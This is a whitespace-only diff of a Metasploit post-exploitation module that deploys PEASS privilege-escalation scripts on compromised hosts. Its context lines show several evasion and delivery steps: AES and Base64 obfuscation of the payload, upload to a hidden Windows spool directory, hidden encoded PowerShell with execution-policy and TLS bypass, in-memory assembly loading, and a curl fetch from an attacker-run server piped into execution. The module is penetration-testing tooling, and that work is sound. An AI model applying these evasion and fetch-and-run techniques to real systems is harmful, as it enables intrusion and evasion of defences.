@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Post
         OptString.new('SSL', [false, 'Indicate if you want to communicate with https (only used if SRVHOST)', true]),
         OptString.new('URIPATH', [false, 'URI path to download the script from there (only used if SRVHOST)', "/" + rand(36**4).to_s(36) + ".txt"])
       ])
-    
+
     @temp_file_path = ""
   end
 
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
 
       # Get encrypted PEASS script in B64
       print_status("Encrypting PEASS and encoding it in Base64...")
-      
+
       # Needed code to decrypt from unix
       if !session.platform.include?("win")
         aes_enc_peass_ret = aes_enc_peass(peass_script)
@@ -104,23 +104,23 @@ class MetasploitModule < Msf::Post
         key_hex = aes_enc_peass_ret["key_hex"]
         iv_hex = aes_enc_peass_ret["iv_hex"]
         decode_linpeass_cmd = "openssl aes-256-cbc -base64 -d -K #{key_hex} -iv #{iv_hex}"
-      
+
       # Needed code to decrypt from Windows
       else
         # As the PS function is only capable of decrypting readable strings
-        # in Windows we encrypt the B64 of the binary and then load it in memory 
+        # in Windows we encrypt the B64 of the binary and then load it in memory
         # from the initial B64. Then: original -> B64 -> encrypt -> B64
         aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) # Base64 before encrypting it
         peass_script_64 = aes_enc_peass_ret["encrypted"]
         key_b64 = aes_enc_peass_ret["key_b64"]
         iv_b64 = aes_enc_peass_ret["iv_b64"]
         load_winpeas = get_ps_aes_decr()
-        
+
         ps_var2 = rand(36**6).to_s(36)
         load_winpeas += "$#{ps_var2} = DecryptStringFromBytesAes \"#{key_b64}\" \"#{iv_b64}\" $#{ps_var1};"
         load_winpeas += "$#{rand(36**7).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var2}));"
       end
-    
+
     else
       # If no Windows, check if base64 exists
       if !session.platform.include?("win")
@@ -135,9 +135,9 @@ class MetasploitModule < Msf::Post
       # Needed code to decode it in Unix and Windows
       decode_linpeass_cmd = "base64 -d"
       load_winpeas = "$#{rand(36**6).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
-    
+
     end
-    
+
     # Write obfuscated PEASS to a local file
     file = Tempfile.new('peass_metasploit')
     file.write(peass_script_64)
@@ -154,13 +154,13 @@ class MetasploitModule < Msf::Post
         else
           temp_path = temp_path + "\\#{temp_peass_name}"
         end
-      
+
       elsif session.platform.include?("win")
         temp_path = "C:\\Windows\\System32\\spool\\drivers\\color\\#{temp_peass_name}"
       else
         temp_path = "/tmp/#{temp_peass_name}"
       end
-      
+
       print_status("Uploading obfuscated peass to #{temp_path}...")
       upload_file(temp_path, file.path)
       print_good("Uploaded")
@@ -184,15 +184,15 @@ class MetasploitModule < Msf::Post
       http_ip = datastore["SRVHOST"]
       http_port = ":#{datastore['SRVPORT']}"
       http_path = datastore["URIPATH"]
-      url_download_peass = http_protocol + http_ip + http_port + http_path      
+      url_download_peass = http_protocol + http_ip + http_port + http_path
       print_good("Listening in #{url_download_peass}")
-      
+
       # Configure the download of the script in Windows
       if session.platform.include?("win")
         cmd = "$ProgressPreference = 'SilentlyContinue';"
         cmd += get_bypass_tls_cert()
         cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
-      
+
       # Configure the download of the script in Unix
       else
         cmd = "curl -k -s \"#{url_download_peass}\""
@@ -204,7 +204,7 @@ class MetasploitModule < Msf::Post
         end
       end
     end
-    
+
     # Run PEASS script
     begin
       tmpout = "\n"
@@ -218,9 +218,9 @@ class MetasploitModule < Msf::Post
         # Transform to Base64 in UTF-16LE format
         cmd_utf16le = cmd.encode("utf-16le")
         cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
-        
+
         tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"].to_i)
-      
+
         # If Unix, then, suppose linpeas was loaded
       else
         cmd += "| #{decode_linpeass_cmd}"
@@ -232,11 +232,11 @@ class MetasploitModule < Msf::Post
       print "\n#{tmpout}\n\n"
       command_log = store_loot("PEASS", "text/plain", session, tmpout, "peass.txt", "PEASS script execution")
       print_good("PEASS output saved to: #{command_log}")
-    
+
     rescue ::Exception => e
       print_bad("Error Running PEASS: #{e.class} #{e}")
     end
-    
+
     # Close and delete the temporary file
     file.close
     file.unlink
@@ -261,7 +261,7 @@ class MetasploitModule < Msf::Post
       response.value
     end
   end
- 
+
   def load_peass
     # Load the PEASS script from a local file or from Internet
     peass_script = ""
@@ -277,14 +277,14 @@ class MetasploitModule < Msf::Post
       target = URI.parse url_peass
       raise 'Invalid URL' unless target.scheme =~ /https?/
       raise 'Invalid URL' if target.host.to_s.eql? ''
-      
+
       res = fetch(target)
       peass_script = res.body
 
       raise "Something failed downloading PEASS script from #{url_peass}" if peass_script.length < 500
 
     else
-      raise "PEASS local file (#{url_peass}) does not exist!" unless ::File.exist?(url_peass)        
+      raise "PEASS local file (#{url_peass}) does not exist!" unless ::File.exist?(url_peass)
       peass_script = File.read(url_peass)
       raise "Something falied reading PEASS script from #{url_peass}" if peass_script.length < 500
     end
@@ -296,7 +296,7 @@ class MetasploitModule < Msf::Post
     # Encrypt the PEASS script with AES (CBC Mode)
     key = datastore["PASSWORD"]
     iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv
-    
+
     c = OpenSSL::Cipher.new('aes-256-cbc').encrypt
     c.iv = iv
     c.key = key
